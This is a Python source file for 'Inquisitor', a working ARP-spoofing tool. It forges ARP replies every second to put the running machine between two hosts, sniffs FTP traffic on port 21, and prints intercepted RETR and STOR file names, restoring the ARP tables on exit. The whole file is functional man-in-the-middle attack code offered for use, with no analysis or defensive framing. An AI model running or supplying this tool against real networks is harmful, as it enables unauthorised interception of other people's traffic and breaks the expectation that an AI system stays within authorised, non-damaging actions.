"""Inquisitor - ARP spoofing tool with FTP sniffing.

Performs bidirectional ARP poisoning between two IPv4 hosts and
displays FTP file transfers intercepted in real time.
Restores the ARP tables on exit (SIGINT or SIGTERM).
"""
import re
import sys
import time
import signal
import platform
import ipaddress
from threading import Thread
from ipaddress import IPv4Address
from argparse import ArgumentParser


from scapy.all import Ether, ARP, IP, sendp, sniff, Raw, Packet

MAC_RE = re.compile("[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$")


def handler(signum, frame) -> None:
    """Convert SIGTERM into a KeyboardInterrupt for clean shutdown."""
    raise KeyboardInterrupt


def restore_arp(arp_table: dict[str, list[str]]) -> None:
    """Send correct ARP replies to restore the original ARP tables.

    Called on exit to undo the poisoning. Each host receives 7 replies
    to ensure the update takes effect.

    Args:
        arp_table: dict with "client" and "server" keys, each mapping
                   to [ip, mac].
    """
    ip_client = arp_table["client"][0]
    ip_server = arp_table["server"][0]
    mac_client = arp_table["client"][1]
    mac_server = arp_table["server"][1]

    sendp(
        Ether(dst=mac_server) / ARP(
            op=2,
            pdst=ip_server,
            psrc=ip_client,
            hwdst=mac_server,
            hwsrc=mac_client,
        ),
        verbose=0,
        count=7,
    )
    sendp(
        Ether(dst=mac_client) / ARP(
            op=2,
            pdst=ip_client,
            psrc=ip_server,
            hwdst=mac_client,
            hwsrc=mac_server,
        ),
        verbose=0,
        count=7,
    )


def process_packet(packet: Packet) -> None:
    """Print FTP file transfers intercepted on the network.

    Only RETR and STOR commands are displayed. Other packets
    are silently ignored.

    Args:
        packet: a Scapy packet captured on TCP port 21.
    """
    if packet.haslayer(Raw):
        data = packet[Raw].load
        parts = data.decode('utf-8', errors='ignore').split()

        if len(parts) < 2:
            return

        if parts[0] in ("RETR", "STOR"):
            filename = parts[1].strip()
            print(
                f"Command: {parts[0]} - "
                f"src: {packet[IP].src} -> "
                f"dst: {packet[IP].dst} - "
                f"File: {filename}"
            )


def sniff_packets() -> None:
    """Sniff TCP traffic on port 21 and pass each packet to process_packet.

    Runs until the thread is stopped.
    """
    try:
        sniff(filter="tcp port 21", prn=process_packet, store=False)
    except Exception as e:
        print(f"sniff thread: {type(e).__name__}: {e}")


def spoof(arp_table: dict[str, list[str]]) -> None:
    """Poison the ARP tables of both hosts every second.

    Sends forged ARP replies in both directions so that traffic between
    client and server is routed through this machine.

    Args:
        arp_table: dict with "client" and "server" keys, each mapping
                   to [ip, mac].
    """
    ip_client = arp_table["client"][0]
    ip_server = arp_table["server"][0]
    mac_client = arp_table["client"][1]
    mac_server = arp_table["server"][1]

    try:
        while True:
            sendp(
                Ether(dst=mac_client) / ARP(
                    op=2,
                    pdst=ip_client,
                    psrc=ip_server,
                    hwdst=mac_client,
                ),
                verbose=0,
            )
            sendp(
                Ether(dst=mac_server) / ARP(
                    op=2,
                    pdst=ip_server,
                    psrc=ip_client,
                    hwdst=mac_server
                ),
                verbose=0,
            )
            time.sleep(1)
    except Exception as e:
        print(f"spoof thread: {type(e).__name__}: {e}")


def validate_args() -> dict[str, list[str]]:
    """Parse and validate the command-line arguments.

    Returns:
        dict with "client" and "server" keys, each mapping to [ip, mac].

    Raises:
        ValueError: if an IP is not IPv4 or a MAC has an invalid format.
    """
    description = (
        "ARP spoofing tool that performs bidirectional "
        "ARP poisoning between two hosts, intercepting "
        "and displaying FTP file transfers in real time. "
        "Restores ARP tables on exit."
    )
    parser = ArgumentParser(description=description)

    parser.add_argument("IP_src", type=str, help="IP source")
    parser.add_argument("MAC_src", type=str, help="MAC source")
    parser.add_argument("IP_target", type=str, help="IP target")
    parser.add_argument("MAC_target", type=str, help="MAC target")

    args = parser.parse_args()

    if not isinstance(ipaddress.ip_address(args.IP_src), IPv4Address):
        raise ValueError("IP source must be a IPv4 address")

    if not MAC_RE.match(args.MAC_src):
        raise ValueError("Wrong MAC format for MAC source")

    if not isinstance(ipaddress.ip_address(args.IP_target), IPv4Address):
        raise ValueError("IP target must be a IPv4 address")

    if not MAC_RE.match(args.MAC_target):
        raise ValueError("Wrong MAC format for MAC target")

    arp_table = {
        "client": [args.IP_src, args.MAC_src],
        "server": [args.IP_target, args.MAC_target],
    }
    return arp_table


def run() -> None:
    """Start the spoof and sniff threads, then wait for a signal."""
    if platform.system() != "Linux":
        print("Error: this program is only compatible with Linux systems.")
        sys.exit(1)

    try:
        arp_table = validate_args()

        signal.signal(signal.SIGTERM, handler)

        Thread(target=spoof, args=(arp_table,), daemon=True).start()
        Thread(target=sniff_packets, daemon=True).start()

        signal.pause()

    except KeyboardInterrupt:
        restore_arp(arp_table)
        print(
            f"{KeyboardInterrupt.__name__}: "
            "ARP tables restored - Shutting down..."
        )
        sys.exit(0)
    except (ValueError, OSError) as e:
        print(f"{type(e).__name__}: {e}")
        sys.exit(1)
